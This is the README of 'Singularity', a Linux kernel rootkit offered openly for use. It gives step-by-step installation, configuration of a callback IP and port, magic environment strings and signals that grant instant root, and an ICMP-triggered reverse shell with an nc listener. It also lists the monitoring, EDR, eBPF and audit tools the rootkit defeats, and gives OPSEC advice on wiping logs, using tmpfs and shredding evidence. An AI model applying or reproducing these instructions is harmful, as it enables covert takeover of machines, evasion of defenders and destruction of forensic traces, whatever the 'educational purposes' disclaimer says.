# Singularity - Stealthy Linux Kernel Rootkit

<img src="https://i.imgur.com/n3U5fsP.jpeg" alt="Singularity Rootkit" width="600"/>

> *"Shall we give forensics a little work?"*

**Singularity** is a powerful Linux Kernel Module (LKM) rootkit designed for modern 6.x kernels. It provides comprehensive stealth capabilities through advanced system call hooking via ftrace infrastructure.

**Full Research Article**: [Singularity: A Final Boss Linux Kernel Rootkit](https://blog.kyntra.io/Singularity-A-final-boss-linux-kernel-rootkit)

**EDR Evasion Case Study**: [Bypassing Elastic EDR with Singularity](https://matheuzsecurity.github.io/hacking/bypassing-elastic/)

---

## What is Singularity?

Singularity is a sophisticated rootkit that operates at the kernel level, providing:

- **Process Hiding**: Make any process completely invisible to the system
- **File & Directory Hiding**: Conceal files using pattern matching
- **Network Stealth**: Hide TCP/UDP connections and ports
- **Privilege Escalation**: Multiple methods to gain instant root access
- **Log Sanitization**: Filter kernel logs and system journals in real-time
- **Self-Hiding**: Remove itself from module lists and system monitoring
- **Remote Access**: ICMP-triggered reverse shell with automatic hiding
- **Anti-Detection**: Block eBPF tools, io_uring operations, and prevent module loading
- **Audit Evasion**: Drop audit messages for hidden processes at netlink level

---

## Features

- Environment-triggered privilege elevation via signals and environment variables
- Complete process hiding from /proc and monitoring tools
- Pattern-based filesystem hiding for files and directories
- Network connection concealment from netstat, ss, and packet analyzers
- Real-time kernel log filtering for dmesg and journalctl
- Module self-hiding from lsmod and /sys/module
- Automatic kernel taint flag normalization
- BPF syscall interception to prevent eBPF-based detection
- io_uring protection against asynchronous I/O bypass
- Prevention of new kernel module loading
- Log masking for kernel messages and system logs
- Evasion of standard rootkit detectors (unhide, chkrootkit, rkhunter)
- Automatic child process tracking and hiding via tracepoint hooks
- Multi-architecture support (x64 + ia32)
- Network packet-level filtering with raw socket protection
- Protection against all file I/O variants (read, write, splice, sendfile, tee, copy_file_range)
- Netlink-level audit message filtering to evade auditd detection

---

## Installation

### Prerequisites

- Linux kernel 6.x (tested on 6.8.0-79-generic and 6.12)
- Kernel headers for your running kernel
- GCC and Make
- Root access

### Quick Start
```bash
cd /dev/shm
git clone https://github.com/MatheuZSecurity/Singularity
cd Singularity

# IMPORTANT: Configure your IP before compiling
# Edit include/core.h and modules/icmp.c

make
sudo insmod singularity.ko
sudo bash scripts/journal.sh
sudo bash scripts/x.sh
cd ..
```

### Important Notes

**The module automatically hides itself after loading**

**There is no unload feature - reboot required to remove**

**Test in a VM first - cannot be removed without restarting**

---

## Configuration

### Set Your Server IP

**Edit `include/core.h`:**
```c
#define YOUR_SRV_IP "192.168.1.100"  // Change this
#define YOUR_SRV_IPv6 { .s6_addr = { [15] = 1 } }  // IPv6 if needed
```

**Edit `modules/icmp.c`:**
```c
#define SRV_PORT "8081"
```

### Customize Hidden Patterns

**Edit `include/hiding_directory_def.h`:**
```c
static const char *hidden_patterns[] = {
    "jira",
    "singularity",
    "obliviate",
    "matheuz",
    "zer0t",
    "your_pattern_here",
    NULL
};
```

### Change Hidden Port

**Edit `modules/hiding_tcp.c`:**
```c
#define PORT 8081  // Your hidden port
```

### Customize Magic Word

**Edit `modules/become_root.c`:**
```c
if (strstr(envs, "MAGIC=mtz")) {  // Change "mtz" to your string
    rootmagic();
}
```

### Change ICMP Magic Sequence

**Edit `modules/icmp.c`:**
```c
#define ICMP_MAGIC_SEQ 1337  // Change to your sequence
```

---

## Usage

### Hide Processes
```bash
# Hide current shell
kill -59 $$

# Hide specific process
kill -59 <PID>
```

Process will be invisible to ps, top, htop, /proc, and all monitoring tools. All child processes are automatically tracked and hidden.

<p align="center">
<img src="https://i.imgur.com/wX2g459.png">
</p>

### Hide Files & Directories

Files matching your configured patterns are automatically hidden:
```bash
mkdir singularity
echo "secret" > singularity/data.txt

# Invisible to ls, find, locate
ls -la | grep singularity
# (no output)

# But you can still access it
cat singularity/data.txt
# secret

# cd is blocked for security
cd singularity
# bash: cd: singularity: No such file or directory
```

<p align="center">
<img src="https://i.imgur.com/a8eb6KS.png">
</p>

### Become Root

**Method 1: Environment Variable**
```bash
MAGIC=mtz bash
id  # uid=0(root)
```

**Method 2: Signal**
```bash
kill -59 $$
id  # uid=0(root)
```

<p align="center">
<img src="https://i.imgur.com/jCoi0LV.png">
</p>

### Hide Network Connections

Connections on your configured port are automatically hidden:
```bash
nc -lvnp 8081

# Invisible to all monitoring
ss -tulpn | grep 8081        # (no output)
netstat -tulpn | grep 8081   # (no output)
lsof -i :8081                # (no output)
```

Packets are dropped at raw socket level (tpacket_rcv) and hidden from /proc/net/* interfaces.

<p align="center">
<img src="https://i.imgur.com/WUuLu1q.png">
</p>

### ICMP Reverse Shell

Trigger a hidden reverse shell remotely:

**1. Start listener:**
```bash
nc -lvnp 8081
```

**2. Send ICMP trigger:**
```bash
sudo python3 scripts/trigger.py <target_ip>
```

**3. Receive root shell** (automatically hidden with all child processes)

<p align="center">
<img src="https://i.imgur.com/4bmbmwY.png">
</p>

---

## Protection Mechanisms

### Ftrace Control Protection

All attempts to disable ftrace are silently intercepted and blocked:
```bash
echo 0 > /proc/sys/kernel/ftrace_enabled       # Appears successful but does nothing
```

Protected syscalls: write, writev, pwrite64, pwritev, pwritev2, sendfile, sendfile64, splice, vmsplice, tee, copy_file_range, io_uring_enter (with intelligent per-PID caching)

### BPF Syscall Blocking

eBPF operations are intercepted and blocked:
- BPF_PROG_LOAD (tracepoint, kprobe, tracing, LSM, ext types)
- BPF_ITER_CREATE, BPF_PROG_GET_NEXT_ID, BPF_MAP_GET_NEXT_ID
- BPF_RAW_TRACEPOINT_OPEN, BPF_LINK_CREATE
- BPF_PROG_QUERY, BPF_OBJ_GET_INFO_BY_FD
- All BPF operations from hidden PIDs

### io_uring Protection

Protection against io_uring bypass in ftrace_enabled and tracing_on attempts with intelligent caching (1 second cache per PID to prevent repeated process scanning and reduce overhead)

### Log Sanitization

Real-time filtering of sensitive strings from kernel and system logs:
- /proc/kmsg
- /sys/kernel/debug/tracing/*
- /var/log/kern.log, syslog, auth.log
- /proc/vmallocinfo, /proc/kallsyms, /proc/kcore
- Scheduler debug output (sched_debug_show)

Filtered keywords: taint, journal, singularity, Singularity, matheuz, zer0t, kallsyms_lookup_name, obliviate

### Process Hiding Implementation

Complete hiding from syscalls and kernel interfaces:
- /proc/[pid]/* (openat, readlinkat blocked)
- getdents, getdents64 (directory listing filtered)
- stat, lstat, statx, newfstatat (metadata hidden)
- kill with signal 0 (returns ESRCH)
- getsid, getpgid, getpgrp (returns ESRCH)
- sched_getaffinity, sched_getparam, sched_getscheduler, sched_rr_get_interval (returns ESRCH)
- getpriority (returns ESRCH)
- sysinfo (process count adjusted)

Child processes automatically tracked via sched_process_fork tracepoint hook.

---

## Bypassed Security Tools

**Process Monitoring**: ps, top, htop, etc

**Filesystem**: ls, find, locate, stat, lstat, readlink, debugfs (when using /dev/shm)

**Network**: netstat, ss, lsof, tcpdump, wireshark, /proc/net/*

**Logs & Traces**: dmesg, journalctl, strace, ltrace, ftrace, perf, bpftrace, bpftool, libbpf

**Rootkit Detectors**: unhide, chkrootkit, rkhunter

**Module Detection**: lsmod, modinfo, /sys/module, /proc/modules, kmod

**Modern Detection**: eBPF-based security tools (Tracee), io_uring-based monitors

---

## Evasion Techniques

### Use tmpfs for Operations
```bash
cd /dev/shm
mkdir singularity
# Work here - invisible to debugfs disk analysis
```

### Secure File Deletion
```bash
shred -vfz -n 10 sensitive_file
rm -f sensitive_file
```

### Customize All Indicators

Change all default values to avoid signature-based detection:

**Patterns:**
```c
static const char *hidden_patterns[] = {
    "random_xyz_unique_string",
    NULL
};
```

**Other customizations:**
- Magic word: `MAGIC=your_unique_string`
- ICMP sequence: `#define ICMP_MAGIC_SEQ 31337`
- Port: `#define PORT 54321`
- Thread name: `#define RESET_THREAD_NAME "systemd_worker"`
- Process name: `#define PROC_NAME "kworker/0:1"`

### Persistence (Use it if you want, but be aware of the risk)

Don't use `load_and_persistence.sh` for stealth operations - module becomes visible in filesystem and can be detected by debugfs disk analysis. Load manually each session: `sudo insmod singularity.ko`

### More OPSEC

1. Always work in /dev/shm (tmpfs)
2. Use unique, random names for everything
3. Clean journal logs after operations: `sudo bash scripts/journal.sh` (can be detected via audit logs, so be careful, this will be resolved in future updates to Singularity)
4. Remove all traces: `sudo bash scripts/x.sh`
5. Customize all default strings before compilation
6. Use non-standard ports and sequences

---

## Syscall Hooks

| Syscall/Function | Module | Purpose |
|---------|--------|---------|
| getdents, getdents64 | hiding_directory.c | Filter directory entries, hide PIDs |
| stat, lstat, newstat, newlstat, statx, newfstatat | hiding_stat.c | Hide file metadata, adjust nlink |
| openat | open.c | Block access to hidden /proc/[pid] |
| readlinkat | hiding_readlink.c | Block symlink resolution |
| chdir | hiding_chdir.c | Prevent cd into hidden dirs |
| read, pread64, readv, preadv | clear_taint_dmesg.c | Filter kernel logs |
| sched_debug_show | clear_taint_dmesg.c | Filter scheduler debug |
| write, writev, pwrite64, pwritev, sendfile, sendfile64, copy_file_range, splice, vmsplice, tee | hooks_write.c | Block ftrace/tracing control |
| io_uring_enter | hooks_write.c | Block async I/O bypass |
| kill, getuid | become_root.c | Root trigger + magic env detection |
| getsid, getpgid, getpgrp, sched_*, sysinfo | become_root.c | Hide PID queries |
| getpriority | hiding_stat.c | Hide priority queries |
| tcp4_seq_show, tcp6_seq_show, tpacket_rcv | hiding_tcp.c | Hide network connections |
| bpf | bpf_hook.c | Block eBPF tools |
| init_module, finit_module | hooking_insmod.c | Prevent module loading |
| icmp_rcv | icmp.c | ICMP-triggered reverse shell |
| module_hide_current | hide_module.c | Remove from lists/sysfs |
| sched_process_fork (tracepoint) | trace.c | Track child processes |
| tainted_mask (kthread) | reset_tainted.c | Clear kernel taint flags |
| netlink_unicast | audit.c | Drop audit messages for hidden PIDs |

**Multi-Architecture Support**: x86_64 (`__x64_sys_*`) and ia32 (`__ia32_sys_*`, `__ia32_compat_sys_*`)

---

## Compatibility

**Tested on**: Kernel 6.8.0-79-generic ✅ | Kernel 6.12 ✅

**Architecture**: x86_64 (primary) | ia32 (full support)

**May not work on**: Kernels < 6.x | Kernels without ftrace support

**Always test in a VM first**

---

## The Plot

Unfortunately for some...

Even with all these filters, protections, and hooks, there are still ways to detect this rootkit.

But if you're a good forensic analyst, DFIR professional, or malware researcher, I'll let you figure it out on your own.

I won't patch for this, because it will be much more OP ;)

---

## Credits

**Singularity** was created by **MatheuZSecurity** (Matheus Alves)

- LinkedIn: [mathsalves](https://www.linkedin.com/in/mathsalves/)
- Discord: `kprobe`

**Join Rootkit Researchers**: Discord - [https://discord.gg/66N5ZQppU7](https://discord.gg/66N5ZQppU7)

### Code References

- [fuxSocy](https://github.com/iurjscsi1101500/fuxSocy/tree/main)
- [MatheuZSecurity/Rootkit](https://github.com/MatheuZSecurity/Rootkit)

### Research Inspiration

- [KoviD](https://github.com/carloslack/KoviD)
- [Basilisk](https://github.com/lil-skelly/basilisk)
- [GOAT Diamorphine rootkit](https://github.com/m0nad/Diamorphine)

---

## Contributing

- Submit pull requests for improvements
- Report bugs via GitHub issues
- Suggest new evasion techniques
- Share detection methods (for research)

**Found a bug?** Open an issue or contact me on Discord: `kprobe`

---

## Disclaimer

**FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY**

This rootkit is provided solely for educational purposes and learning.

Use responsibly. Test only on systems you own or have explicit permission to test.

---

## Hi

**Created by MatheuZSecurity**

> "More love and less war"
